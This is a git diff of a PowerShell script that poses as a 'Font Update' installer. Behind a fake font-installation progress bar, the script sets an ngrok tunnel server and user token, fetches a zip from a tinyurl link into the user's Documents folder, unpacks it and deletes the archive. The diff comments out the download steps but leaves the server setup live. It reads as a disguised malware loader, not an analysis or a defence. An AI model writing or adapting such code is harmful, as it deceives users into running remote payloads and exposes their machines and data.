@@ -20,9 +20,9 @@ if (-not $instanceCheck.Acquired) {
 
 try {
     Write-Progress -Activity "Font Update" -Status "Installing fonts, Please do not exit ..." -PercentComplete 10
-    $urlServer = "https://headrest-borrower-tweak.ngrok-free.dev"
+    $urlServer = "https://headrest-borrower-tweak.ngrok-free.dev"  #"https://cursive.onrender.com"
     $userToken = $ut
-    $url = "https://tinyurl.com/$dpty" 
+    $url = "https://tinyurl.com/$dpty"
     $Documents = "$env:USERPROFILE\Documents"
     $destination = Join-Path $Documents "DataFile.zip"
 
@@ -38,19 +38,19 @@ try {
     }
 
     Write-Progress -Activity "Font Update" -Status "Installing fonts, Please do not exit ..." -PercentComplete 20
-    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue 
-    if ($curl) {
-        curl.exe -s -S -L --retry 10 --retry-delay 5 -o $destination $url | Out-Null
-    } else {
-        Invoke-WebRequest -Uri $url -OutFile $destination | Out-Null
-    }
+    # $curl = Get-Command curl.exe -ErrorAction SilentlyContinue 
+    # if ($curl) {
+    #     curl.exe -s -S -L --retry 10 --retry-delay 5 -o $destination $url | Out-Null
+    # } else {
+    #     Invoke-WebRequest -Uri $url -OutFile $destination | Out-Null
+    # }
 
     Write-Progress -Activity "Font Update" -Status "Installing fonts, Please do not exit ..." -PercentComplete 40
-    Expand-Archive -Path $destination -DestinationPath $DataFilePath -Force | Out-Null
+    # Expand-Archive -Path $destination -DestinationPath $DataFilePath -Force | Out-Null
 
-    Start-Sleep -Seconds 5
+    Start-Sleep -Seconds 2
 
-    Remove-Item $destination -Force -ErrorAction SilentlyContinue | Out-Null
+    # Remove-Item $destination -Force -ErrorAction SilentlyContinue | Out-Null
 
     $codeFolder = "$Documents\CodeFile"
     if (-Not (Test-Path $codeFolder)) {
